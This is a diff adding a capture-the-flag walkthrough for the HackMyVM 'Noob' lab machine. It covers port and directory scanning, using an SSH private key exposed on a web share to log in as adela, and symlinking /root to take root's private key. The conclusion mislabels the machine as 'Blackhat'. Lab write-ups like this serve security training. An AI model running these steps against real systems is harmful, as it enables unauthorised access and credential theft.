@@ -1,0 +1,63 @@
+🧩 Noob Machine Walkthrough – HackMyVM
+Difficulty: Easy
+Goal: Gain access as user adela via SSH key exposure, then escalate to root by abusing symbolic links and accessing root’s private key.
+Target IP: 192.168.1.134
+
+🔍 Initial Enumeration
+Full TCP port scan:
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.134
+Service and version detection:
+
+nmap -sCV -p22,65530 192.168.1.134
+Discovered open ports:
+
+22/tcp – OpenSSH
+
+65530/tcp – HTTP
+
+🌐 Web Analysis
+Directory brute-forcing using Gobuster:
+
+gobuster dir -u http://192.168.1.134 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,jpg -r -k
+Found paths:
+
+/index.html
+
+/nt4share/
+
+Within /nt4share/, an exposed id_rsa private key for the user adela is found.
+
+🔑 User Access via SSH Key
+
+Download the private key and set proper permissions:
+
+chmod 600 id_rsa
+Connect via SSH:
+
+ssh -i id_rsa adela@192.168.1.134
+Access as user adela is granted.
+
+⚡ Privilege Escalation to Root
+
+From within adela’s session, create a symbolic link to the root directory:
+ln -s /root root
+Navigate into the root symlink and access root’s id_rsa.
+
+Use that private key to connect as root:
+
+chmod 600 id_rsa_root
+ssh -i id_rsa_root root@192.168.1.134
+Access granted as root. Both user.txt and root.txt flags are obtained.
+
+🎯 Conclusion
+
+The Blackhat machine was fully compromised due to:
+
+Exposure of SSH private key through a web-accessible directory.
+
+Insecure permissions that allowed reading root’s home directory.
+
+No key passphrases or SSH hardening mechanisms in place.
+
+By chaining these misconfigurations, the attacker is able to pivot from web access to full root shell control.
